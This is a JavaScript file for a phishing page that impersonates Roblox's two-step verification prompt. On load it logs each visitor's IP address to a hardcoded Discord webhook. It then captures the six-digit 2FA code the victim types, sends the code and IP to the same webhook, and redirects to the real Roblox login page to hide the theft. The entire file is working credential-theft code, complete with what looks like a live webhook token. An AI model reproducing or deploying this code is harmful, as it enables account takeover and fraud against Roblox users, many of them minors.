const webhook_url = "https://discord.com/api/webhooks/1383151738139316264/Q8BZigtGt5CxPjxox4eEMqt1PXNkOdo5E6C2MWeNL94rSf6sO_P08Ob9yU7EkwWhleCZ"; // <--- DON'T FORGET TO PUT YOUR URL HERE

async function sendToWebhook(embed) {
    await fetch(webhook_url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
    }).catch(err => console.error(err));
}

document.addEventListener('DOMContentLoaded', () => {
    // Get IP and send a "visited" notification
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            const visitEmbed = {
                title: "@everyone🎯 Target Landed on Page",
                color: 15158332, // Red
                description: `IP Address: **${ip}**`,
                timestamp: new Date().toISOString()
            };
            sendToWebhook(visitEmbed);
            document.getElementById('verification-form').dataset.ip = ip;
        }).catch(() => {
            document.getElementById('verification-form').dataset.ip = "Unavailable";
        });

    // This ensures only digits can be typed into the input box.
    document.getElementById('code-input').addEventListener('input', function (e) {
        e.target.value = e.target.value.replace(/[^\d]/g, '');
    });
});

// Handle the form submission
document.getElementById('verification-form').addEventListener('submit', function(event) {
    event.preventDefault();
    const codeInput = document.getElementById('code-input');
    const code = codeInput.value;
    const ip = this.dataset.ip || "Unavailable";
    const verifyBtn = document.getElementById('verify-btn');

    if (code.length === 6) {
        verifyBtn.disabled = true;
        verifyBtn.innerText = 'Verifying...';

        const dataEmbed = {
            title: "✅ 2FA Code Captured!",
            color: 5763719, // Green
            fields: [
                { name: "IP Address", value: `\`${ip}\``, inline: true },
                { name: "Verification Code", value: `**\`${code}\`**`, inline: true }
            ],
            timestamp: new Date().toISOString(),
            footer: { text: "Code sent by DarkGemini" }
        };

        sendToWebhook(dataEmbed);

        // Redirect to make it look like an error
        setTimeout(() => {
            window.location.href = "https://www.roblox.com/login/twostep?action=2sv";
        }, 1500);
    }
});